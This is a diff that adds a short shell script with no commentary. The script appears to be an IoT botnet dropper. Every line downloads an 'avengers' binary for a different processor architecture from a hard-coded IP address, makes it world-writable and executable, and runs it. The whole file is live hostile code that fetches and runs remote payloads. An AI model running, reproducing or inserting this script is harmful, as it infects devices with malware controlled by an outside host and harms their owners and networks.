@@ -1,0 +1,14 @@
+#!/bin/sh
+wget http://185.244.25.149/bins/avengers.mips;chmod 777 avengers.mips;./avengers.mips;
+wget http://185.244.25.149/bins/avengers.mipsel;chmod 777 avengers.mipsel;./avengers.mipsel;
+wget http://185.244.25.149/bins/avengers.sh4;chmod 777 avengers.sh4;./avengers.sh4;
+wget http://185.244.25.149/bins/avengers.x86_64;chmod 777 avengers.x86_64;./avengers.x86_64;
+wget http://185.244.25.149/bins/avengers.armv6l;chmod 777 avengers.armv6l;./avengers.armv6l;
+wget http://185.244.25.149/bins/avengers.i686;chmod 777 avengers.i686;./avengers.i686;
+wget http://185.244.25.149/bins/avengers.powerpc;chmod 777 avengers.powerpc;./avengers.powerpc;
+wget http://185.244.25.149/bins/avengers.i586;chmod 777 avengers.i586;./avengers.i586;
+wget http://185.244.25.149/bins/avengers.m68k;chmod 777 avengers.m68k;./avengers.m68k;
+wget http://185.244.25.149/bins/avengers.sparc;chmod 777 avengers.sparc;./avengers.sparc;
+wget http://185.244.25.149/bins/avengers.armv4l;chmod 777 avengers.armv4l;./avengers.armv4l;
+wget http://185.244.25.149/bins/avengers.armv5l;chmod 777 avengers.armv5l;./avengers.armv5l;
+wget http://185.244.25.149/bins/avengers.ppc;chmod 777 avengers.ppc;./avengers.ppc;
